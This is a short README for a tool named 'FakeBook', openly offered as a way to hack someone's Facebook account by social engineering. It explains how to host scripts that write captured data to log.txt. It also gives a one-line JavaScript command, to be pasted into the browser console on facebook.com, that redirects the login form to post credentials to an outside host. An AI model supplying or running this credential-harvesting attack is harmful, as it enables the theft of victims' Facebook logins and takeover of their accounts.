# FakeBook - JavaScript inject0r
Hack Someone Facebook With JavaScript inject0r (Social Engineering)

Upload All the scripts from <strong>https://github.com/aghanathan/FakeBook</strong> into your Web Hosting (e.g. <b>'/public_html/FakeBook'</b>)
It Will Create a text file ('log.txt') (e.g. <b>http://gofreelancer.xyz/FakeBook/log.txt</b>)

<h3><u>How To Inject & use JavaScript to change the form action</u></h3>
<ul>
  <li>Open <strong>https://www.facebook.com</strong> with <b>Google Chrome</b> Browser</li>
  <li>Right-click on any page element and select <b>Inspect Element</b> and then <b>Console</b></li>
  <li>Copy & Paste (<b>Crtl+V</b>) of this a line Javascript:<br>
    <code>document.getElementById('login_form').action = 'http://gofreelancer.xyz/FakeBook/login.php';</code>
  </li>
</ul>
